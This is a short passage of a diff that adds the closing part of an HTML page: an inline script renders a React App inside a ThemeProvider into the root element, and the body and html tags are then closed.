+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  BOOT
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const root = createRoot(document.getElementById('root'));
+        root.render(
+            <ThemeProvider>
+                <App />
+            </ThemeProvider>
+        );
+    </script>
+
+</body>
+</html>
